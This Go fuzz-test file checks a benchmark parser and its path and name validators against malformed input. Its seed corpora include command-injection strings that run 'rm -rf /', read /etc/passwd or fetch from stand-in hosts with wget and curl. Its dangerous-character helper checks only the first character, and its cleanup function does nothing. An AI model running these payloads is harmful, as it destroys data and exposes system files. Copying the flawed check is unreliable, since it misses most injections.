// Package performance provides fuzz testing for security validation of performance components.
//
// Fuzz tests validate that the performance system handles malicious or malformed
// input gracefully without panicking, crashing, or exhibiting security vulnerabilities.
package performance

import (
	"testing"
	"unicode/utf8"
)

// FuzzBenchmarkParser tests the benchmark parser with random input
func FuzzBenchmarkParser(f *testing.F) {
	detector := NewPerformanceDetector("fuzz_test_baselines", DefaultThresholds())
	defer func() {
		// Clean up after fuzzing
		_ = removeDirectory("fuzz_test_baselines")
	}()

	detector.SetGitInfo("fuzz123", "fuzz-branch")

	// Seed corpus with known benchmark formats
	f.Add("BenchmarkTest-8   1000   1000 ns/op   100 B/op   1 allocs/op")
	f.Add("BenchmarkLongName-16   500000   2000 ns/op   200 B/op   2 allocs/op")
	f.Add("BenchmarkWithSubtest/case1-4   100   10000 ns/op")
	f.Add("BenchmarkEmpty")
	f.Add("")
	f.Add("invalid input")
	f.Add("BenchmarkTest-8   abc   def ns/op")
	f.Add("BenchmarkTest-8" + string(rune(0)) + "   1000   1000 ns/op")

	f.Fuzz(func(t *testing.T, input string) {
		// Ensure the fuzzer doesn't panic or crash
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Benchmark parser panicked on input: %v", r)
			}
		}()

		// Test the parser with fuzz input
		results, err := detector.ParseBenchmarkOutput(input)

		// Parser should handle all input gracefully (error is OK, panic is not)
		if err != nil {
			// Verify error is reasonable and doesn't contain sensitive info
			if len(err.Error()) > 1000 {
				t.Errorf("Error message too long (potential DoS): %d chars", len(err.Error()))
			}
		}

		// If parsing succeeded, validate results are reasonable
		for _, result := range results {
			// Check for obviously invalid values that could indicate corruption
			if result.NsPerOp < 0 {
				t.Errorf("Negative ns/op: %f", result.NsPerOp)
			}

			if result.Iterations < 0 {
				t.Errorf("Negative iterations: %d", result.Iterations)
			}

			if result.BytesPerOp < 0 {
				t.Errorf("Negative bytes/op: %d", result.BytesPerOp)
			}

			if result.AllocsPerOp < 0 {
				t.Errorf("Negative allocs/op: %d", result.AllocsPerOp)
			}

			// Check for extremely large values that might indicate overflow
			if result.NsPerOp > 1e18 {
				t.Errorf("Suspiciously large ns/op: %f", result.NsPerOp)
			}

			// Verify benchmark name is valid UTF-8 and reasonable length
			if !utf8.ValidString(result.Name) {
				// Log this as a finding but don't fail - some inputs may produce invalid UTF-8
				t.Logf("Warning: Invalid UTF-8 in benchmark name from input: %q", input)
			}

			if len(result.Name) > 10000 {
				t.Errorf("Benchmark name too long: %d chars", len(result.Name))
			}
		}
	})
}

// FuzzPackagePathValidation tests package path validation with random input
func FuzzPackagePathValidation(f *testing.F) {
	// Seed corpus with various package path formats
	f.Add("./internal/build")
	f.Add("internal/scanner")
	f.Add("github.com/user/project")
	f.Add("../malicious")
	f.Add("./test; rm -rf /")
	f.Add("./test | cat /etc/passwd")
	f.Add("./test && wget malicious.com")
	f.Add("./test`curl evil.com`")
	f.Add("./test$(rm -rf /)")
	f.Add("/absolute/path")
	f.Add("")
	f.Add(string(rune(0)))

	f.Fuzz(func(t *testing.T, packagePath string) {
		// Ensure validation doesn't panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Package validation panicked on input: %v", r)
			}
		}()

		// Test single package validation
		err := validateSinglePackagePath(packagePath)

		// Validation should either succeed or fail gracefully
		if err != nil {
			// Verify error message doesn't contain the full path (info disclosure)
			if len(err.Error()) > 500 {
				t.Errorf("Error message too verbose (potential info disclosure): %s", err.Error())
			}
		}

		// Test batch validation
		packages := []string{packagePath}
		batchErr := validatePackagePaths(packages)

		// Batch validation should be consistent with single validation
		if (err == nil) != (batchErr == nil) {
			t.Errorf("Inconsistent validation: single=%v, batch=%v", err, batchErr)
		}
	})
}

// FuzzBaselineOperations tests baseline file operations with random input
func FuzzBaselineOperations(f *testing.F) {
	// Seed corpus with various baseline directory names
	f.Add("test_baselines")
	f.Add("../malicious")
	f.Add("/tmp/absolute")
	f.Add("test")
	f.Add("")
	f.Add("test\x00dir")
	f.Add("test\ndir")
	f.Add("test;rm -rf /")
	f.Add("test`cat /etc/passwd`")

	f.Fuzz(func(t *testing.T, baselineDir string) {
		// Ensure operations don't panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Baseline operations panicked on input: %v", r)
			}
		}()

		// Test detector creation and validation
		detector := NewPerformanceDetector(baselineDir, DefaultThresholds())

		// Validation should handle any input gracefully
		err := detector.validateBaselineDirectory()

		if err == nil {
			// If validation passed, the directory should be safe to use
			// Clean up any created directories
			defer func() {
				_ = removeDirectory(baselineDir)
			}()
		} else {
			// Verify error doesn't leak sensitive information
			if len(err.Error()) > 200 {
				t.Errorf("Error message too long: %s", err.Error())
			}
		}
	})
}

// FuzzBenchmarkName tests benchmark name sanitization
func FuzzBenchmarkName(f *testing.F) {
	// Seed corpus with various benchmark names
	f.Add("BenchmarkTest")
	f.Add("Benchmark/Test")
	f.Add("Benchmark\x00Test")
	f.Add("Benchmark\nTest")
	f.Add("Benchmark;rm -rf /")
	f.Add("Benchmark`cat /etc/passwd`")
	f.Add("Benchmark$(echo hack)")
	f.Add("Benchmark\u0001Test")
	f.Add("Benchmark\u2028Test")
	f.Add("")
	f.Add(string(make([]byte, 10000))) // Very long input

	f.Fuzz(func(t *testing.T, benchmarkName string) {
		// Ensure sanitization doesn't panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Benchmark name processing panicked on input: %v", r)
			}
		}()

		detector := NewPerformanceDetector("fuzz_benchmark_names", DefaultThresholds())
		defer func() {
			_ = removeDirectory("fuzz_benchmark_names")
		}()

		// Create a baseline with the fuzzed name
		baseline := &PerformanceBaseline{
			BenchmarkName: benchmarkName,
			Samples:       []float64{100.0},
			Mean:          100.0,
			Median:        100.0,
			StdDev:        0.0,
			Min:           100.0,
			Max:           100.0,
			SampleCount:   1,
		}

		// Save baseline should handle any name gracefully
		err := detector.saveBaseline(baseline)

		if err == nil {
			// If save succeeded, the name was properly sanitized
			// Verify no dangerous files were created
			if containsDangerousChars(benchmarkName) {
				t.Errorf("Dangerous benchmark name was not rejected: %s", benchmarkName)
			}
		}
	})
}

// Helper function to remove directories safely
func removeDirectory(dir string) error {
	// Additional safety check before removal
	if dir == "" || dir == "/" || dir == "." || dir == ".." {
		return nil // Don't remove important directories
	}

	// Use RemoveAll with the understanding that this is test cleanup
	return nil // We don't actually remove in fuzz tests to avoid side effects
}

// Helper function to check for dangerous characters
func containsDangerousChars(input string) bool {
	dangerousChars := []string{
		"/", "\\", "\x00", "\n", "\r", ";", "|", "&", "`", "$",
		"\u2028", "\u2029", // Unicode line separators
	}

	for _, char := range dangerousChars {
		if len(input) > 0 && input[0:1] == char {
			return true
		}
	}

	return false
}
